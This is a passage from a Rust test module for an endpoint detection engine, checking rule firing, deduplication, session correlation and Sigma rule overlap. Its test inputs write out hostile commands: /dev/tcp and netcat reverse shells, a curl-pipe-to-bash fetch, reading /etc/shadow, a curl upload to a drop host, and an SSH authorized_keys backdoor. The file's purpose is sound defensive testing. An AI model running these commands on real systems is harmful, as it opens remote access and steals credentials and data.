        let ev = find(&out, "lolbin.download_pipe_shell").expect("still reported");
        assert_eq!(
            ev.severity,
            Severity::Low,
            "Medium base - package manager lineage"
        );
    }

    #[test]
    fn agent_and_its_children_are_never_inspected() {
        let mut e = engine();
        e.self_pid = 4242;
        e.inspect(&exec(
            4242,
            1,
            0,
            "trapd-agent",
            "/opt/trapd/trapd-agent",
            "trapd-agent",
        ));
        let out = e.inspect(&exec(
            4243,
            4242,
            0,
            "sh",
            "/bin/sh",
            "sh -c cat /etc/shadow",
        ));
        assert!(out.is_empty());
        let out = e.inspect(&exec(
            4244,
            4243,
            0,
            "cat",
            "/usr/bin/cat",
            "cat /etc/shadow",
        ));
        assert!(
            out.is_empty(),
            "grandchildren of the agent are its own activity too"
        );
    }

    #[test]
    fn proc_poll_duplicate_of_an_ebpf_exec_is_not_inspected() {
        let e = engine();
        assert_eq!(
            e.inspect(&exec(
                50,
                1,
                0,
                "bash",
                "/bin/bash",
                "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
            ))
            .len(),
            1
        );
        let poll = proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
        assert!(e.inspect(&poll).is_empty());
    }

    #[test]
    fn closed_flow_records_and_resolver_addresses_are_ignored() {
        let e = engine();
        let mut closed = net_event("203.0.113.5", 443);
        if let EventData::NetworkConnection(n) = &mut closed.data {
            n.state = "closed".into();
        }
        assert!(e.inspect(&closed).is_empty());

        // DnsData only knows the resolver; even a "bad" resolver string must
        // not be treated as a domain.
        let dns = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::Dns(crate::schema::DnsData {
                pid: 7,
                uid: 0,
                gid: 0,
                username: "root".into(),
                comm: "curl".into(),
                dst_addr: "evil.test".into(),
                dst_port: 53,
            }),
        );
        assert!(e.inspect(&dns).is_empty());
    }

    #[test]
    fn resolved_domain_is_matched() {
        let e = engine();
        let res = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Network,
            EventAction::Connection,
            Severity::Info,
            EventData::DnsResolution(crate::schema::DnsResolutionData {
                qname: "c2.evil.test".into(),
                qtype: "A".into(),
                resolved_ips: vec!["203.0.113.7".into()],
                cnames: vec![],
                server_addr: "10.0.0.1".into(),
                client_addr: "10.0.0.2".into(),
                transaction_id: 1,
                rcode: "NOERROR".into(),
                pid: None,
                process: None,
                process_start_time: None,
            }),
        );
        let out = e.inspect(&res);
        let ev = find(&out, "ioc.dns_domain").expect("domain IOC fires on the resolved name");
        assert_eq!(
            det_of(ev).correlation.as_ref().unwrap().domain.as_deref(),
            Some("c2.evil.test")
        );
    }

    #[test]
    fn gate_folds_repeats_of_one_command() {
        let e = engine();
        let first = e.admit(e.inspect(&exec(60, 1, 0, "cat", "/usr/bin/cat", "cat /etc/shadow")));
        assert_eq!(first.len(), 1);
        // Same user, binary and command from a new process: same finding.
        let again = e.admit(e.inspect(&exec(61, 1, 0, "cat", "/usr/bin/cat", "cat /etc/shadow")));
        assert!(again.is_empty());
        let flushed = e.flush_findings(true);
        assert_eq!(flushed.len(), 1);
        assert_eq!(det_of(&flushed[0].event).occurrence_count, Some(2));
    }

    #[test]
    fn signal_rules_never_alert() {
        let e = engine();
        let out = e.inspect(&exec(70, 1, 1000, "x", "/tmp/x", "/tmp/x"));
        let ev = find(&out, "defense.tmp_exec").unwrap();
        assert_eq!(det_of(ev).mode, Some(DetectionMode::Signal));
        assert!(ev.severity <= Severity::Low);
    }

    #[test]
    fn session_recon_burst_and_shared_root() {
        let e = engine();
        e.inspect(&exec(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd: u"));
        e.inspect(&exec(200, 100, 1000, "bash", "/bin/bash", "-bash"));
        let mut hits = Vec::new();
        for (pid, c) in [
            (201, "id"),
            (202, "whoami"),
            (203, "uname"),
            (204, "hostname"),
        ] {
            hits.extend(e.inspect(&exec(pid, 200, 1000, c, &format!("/usr/bin/{c}"), c)));
        }
        let burst = find(&hits, "discovery.recon_burst").expect("burst fires");
        assert_eq!(det_of(burst).mode, Some(DetectionMode::Signal));
        let up = e.inspect(&exec(
            205,
            200,
            1000,
            "curl",
            "/usr/bin/curl",
            "curl -T /tmp/a.tgz https://drop.example.net/",
        ));
        let ex = find(&up, "exfil.http_upload").unwrap();
        assert_eq!(
            det_of(burst).correlation.as_ref().unwrap().root_key,
            det_of(ex).correlation.as_ref().unwrap().root_key,
            "one session, one root key"
        );
    }

    #[test]
    fn file_events_replace_command_line_persistence() {
        let e = engine();
        let cmd = "bash -c echo key >> /root/.ssh/authorized_keys";
        assert!(find(
            &e.inspect(&exec(80, 1, 0, "bash", "/bin/bash", cmd)),
            "persistence.ssh_authorized_keys"
        )
        .is_some());
        let open = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Filesystem,
            EventAction::Modify,
            Severity::Info,
            EventData::FileOpen(crate::schema::FileOpenData {
                pid: 81,
                uid: 0,
                gid: 0,
                username: "root".into(),
                comm: "bash".into(),
                path: "/root/.ssh/authorized_keys".into(),
                flags: 0o2001,
            }),
        );
        let out = e.inspect(&open);
        let ev = find(&out, "persistence.ssh_authorized_keys").expect("file rule fires");
        assert_eq!(
            det_of(ev)
                .correlation
                .as_ref()
                .unwrap()
                .file_path
                .as_deref(),
            Some("/root/.ssh/authorized_keys")
        );
        // From now on the command-line guess for the same rule is dropped.
        assert!(find(
            &e.inspect(&exec(82, 1, 0, "bash", "/bin/bash", cmd)),
            "persistence.ssh_authorized_keys"
        )
        .is_none());
    }

    #[test]
    fn collector_detections_are_finalised_and_gated() {
        let e = engine();
        e.inspect(&exec(
            90,
            1,
            0,
            "java",
            "/usr/bin/java",
            "java -jar app.jar",
        ));
        let mem = e.detection(
            Severity::High,
            DetectionData {
                rule_id: "memory.anon_exec".into(),
                title: "t".into(),
                category: "memory".into(),
                confidence: 88,
                subject: "pid 90 (java)".into(),
                detail: "d".into(),
                evidence: serde_json::json!({ "pid": 90 }),
                ..Default::default()
            },
        );
        let out = e.admit_external(mem.clone());
        assert_eq!(out.len(), 1);
        let d = det_of(&out[0].event);
        assert!(d.correlation.as_ref().unwrap().process_key.is_some());
        assert!(d.evidence.get("process_lineage").is_some());
        assert!(
            e.admit_external(mem).is_empty(),
            "same process, same finding"
        );
    }

    #[test]
    fn sanctioned_setuid_binaries_are_quiet() {
        let e = engine();
        let ev = |comm: &str| {
            AgentEvent::new(
                "a".into(),
                "h".into(),
                EventClass::Process,
                EventAction::Setuid,
                Severity::Info,
                EventData::Setuid(SetuidData {
                    pid: 5,
                    old_uid: 1000,
                    new_uid: 0,
                    comm: comm.into(),
                }),
            )
        };
        assert!(find(&e.inspect(&ev("sudo")), "privesc.setuid_root").is_none());
        assert!(find(&e.inspect(&ev("exploit")), "privesc.setuid_root").is_some());
    }

    #[test]
    fn brute_force_success_via_logon_events() {
        let e = engine();
        let logon = |ok: bool| {
            AgentEvent::new(
                "a".into(),
                "h".into(),
                EventClass::User,
                EventAction::Logon,
                Severity::Info,
                EventData::UserLogon(crate::schema::UserLogonData {
                    username: "root".into(),
                    src_addr: Some("198.51.100.9".into()),
                    src_port: None,
                    auth_method: Some("password".into()),
                    success: ok,
                    ..Default::default()
                }),
            )
        };
        for _ in 0..6 {
            assert!(e.inspect(&logon(false)).is_empty());
        }
        let out = e.inspect(&logon(true));
        let ev = find(&out, "auth.ssh_bruteforce_success").unwrap();
        assert_eq!(ev.severity, Severity::High);
    }
    /// The shipped example Sigma rules load, and none of them re-detects an
    /// action a native rule already reports (one action, one finding).
    #[test]
    fn sigma_examples_do_not_duplicate_native_rules() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../deploy/sigma");
        let sigma = sigma::SigmaEngine::from_dir(&dir);
        assert!(sigma.len() >= 3, "example rules compile");
        let e = engine();
        *e.sigma.write().unwrap() = sigma;
        let native_cases = [
            (
                "bash",
                "/usr/bin/bash",
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            ),
            ("bash", "/usr/bin/bash", "bash -c curl http://x/i.sh | bash"),
            ("cat", "/usr/bin/cat", "cat /etc/shadow"),
            (
                "python3",
                "/usr/bin/python3",
                "python3 -c import socket;s=socket.socket();s.connect(('1.2.3.4',1))",
            ),
        ];
        for (i, (comm, exe, cmd)) in native_cases.iter().enumerate() {
            let out = e.inspect(&exec(500 + i as i32, 1, 0, comm, exe, cmd));
            let sigma_hits = out
                .iter()
                .filter(|ev| det_of(ev).category == "sigma")
                .count();
            assert!(!out.is_empty(), "native rule fires for {cmd}");
            assert_eq!(
                sigma_hits, 0,
                "a sample Sigma rule duplicates the native finding for {cmd}"
            );
        }
        // And they still add coverage of their own.
        let out = e.inspect(&exec(
            600,
            1,
            0,
            "nc",
            "/usr/bin/nc",
            "nc 10.0.0.1 4444 -e /bin/sh",
        ));
        assert_eq!(
            out.iter().any(|ev| det_of(ev).category == "sigma"),
            cfg!(target_os = "linux"),
            "Linux example rules must match only Linux event projections"
        );
    }

    /// Detections journaled by an older agent (no correlation / gate fields)
    /// still deserialise, and new optional fields stay off the wire when empty.
    #[test]
    fn detection_payload_is_backward_compatible() {
        let old = r#"{"event_id":"6f1c3c52-0a35-4f0d-9d5c-0b9d6f8f2b11","agent_id":"a","hostname":"h",
            "timestamp":"2026-01-01T00:00:00Z","class":"detection","action":"detected","severity":"high",
            "data":{"rule_id":"revshell.dev_tcp_redirect","title":"t","category":"reverse_shell",
            "confidence":90,"subject":"/bin/bash","detail":"d","evidence":{"cmdline":"x"}}}"#;
        let ev: AgentEvent = serde_json::from_str(old).unwrap();
        let d = det_of(&ev);
        assert_eq!(d.rule_id, "revshell.dev_tcp_redirect");
        assert!(d.correlation.is_none() && d.dedup_key.is_none());
        let json = serde_json::to_value(&ev).unwrap();
        assert!(json["data"].get("correlation").is_none());
        assert!(json["data"].get("occurrence_count").is_none());
    }
}
